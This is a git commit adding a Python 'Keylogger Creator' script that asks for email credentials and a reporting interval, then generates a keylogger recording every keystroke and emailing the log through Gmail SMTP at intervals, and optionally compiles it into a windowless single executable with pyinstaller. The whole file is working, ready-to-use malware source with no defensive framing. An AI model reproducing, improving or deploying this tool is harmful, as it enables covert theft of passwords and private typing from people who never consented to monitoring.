ae9ccca57915f44385d4bde5e084e35d8576cd73
Hirusha Adikari <36286877+hirusha-adi@users.noreply.github.com>
2021-09-23 18:43:24 +0530

    Add files via upload

---
+++ Keylogger Creator/maker.py
@@ -0,0 +1,106 @@
+from os import system as sysrun
+def show_logo():
+    print("""
+        ╦╔═╔═╗╦ ╦╦  ╔═╗╔═╗╔═╗╔═╗╦═╗
+        ╠╩╗║╣ ╚╦╝║  ║ ║║ ╦║ ╦║╣ ╠╦╝
+        ╩ ╩╚═╝ ╩ ╩═╝╚═╝╚═╝╚═╝╚═╝╩╚═
+             by ZeaCeR#5641
+    """)
+show_logo()
+SENDER_EMAIL_ADDR = input("[?] Enter the sender email: ")
+SENDER_EMAIL_PSWD = input("[?] Enter the sender password: ")
+RECIEVER_EMAIL_ADDR = input("[?] Enter the reciever email: ")
+REPORT_TIME = input("[?] Enter the report time(seconds): ")
+cont = r'''import keyboard
+import smtplib
+from threading import Timer
+from datetime import datetime
+
+SEND_REPORT_EVERY = ''' + REPORT_TIME + r'''
+EMAIL_ADDRESS = r"""''' + SENDER_EMAIL_ADDR + r'''"""
+EMAIL_PASSWORD = r"""''' + SENDER_EMAIL_PSWD + r'''"""
+SEND_EMAIL = r"""''' + RECIEVER_EMAIL_ADDR + r'''"""
+
+class Keylogger:
+    def __init__(self, interval, report_method="email"):
+        self.interval = interval
+        self.report_method = report_method
+        self.log = ""
+        self.start_dt = datetime.now()
+        self.end_dt = datetime.now()
+
+    def callback(self, event):
+        name = event.name
+        if len(name) > 1:
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        self.log += name
+    
+    def update_filename(self):
+        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+
+    def report_to_file(self):
+        with open(f"{self.filename}.txt", "w") as f:
+            print(self.log, file=f)
+        print(f"[+] Saved {self.filename}.txt")
+
+    def sendmail(self, to_email, email, password, message):
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, to_email, message)
+        server.quit()
+
+    def report(self):
+        if self.log:
+            self.end_dt = datetime.now()
+            self.update_filename()
+            if self.report_method == "email":
+                self.sendmail(SEND_EMAIL, EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+            elif self.report_method == "file":
+                self.report_to_file()
+            self.start_dt = datetime.now()
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        timer.daemon = True
+        timer.start()
+
+    def start(self):
+        self.start_dt = datetime.now()
+        keyboard.on_release(callback=self.callback)
+        self.report()
+        keyboard.wait()
+
+keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+# keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+keylogger.start()
+'''
+sysrun('cls')
+show_logo()
+print(f"""[+] Recieved Information:
+    * Sender email address: {SENDER_EMAIL_ADDR}
+    * Sender email password: {SENDER_EMAIL_PSWD}
+    * Reciever email address: {RECIEVER_EMAIL_ADDR}
+    * Report every: {REPORT_TIME} seconds""")
+with open("keylogger.py", "w+", encoding="utf8") as file:
+    file.write(cont)
+print("\n[+] File created: keylogger.py")
+COMPILE_YN = input("\n[?] Do you want to compile the file? (Y or N):")
+if COMPILE_YN.lower() == "y":
+    sysrun("pip install keyboard")
+    sysrun("pip install pyinstaller")
+    sysrun("pyinstaller --noconfirm --onefile --windowed keylogger.py")
+else:
+    print("[!!] Thank you for using this software. Have a nice day!")
+
+
+
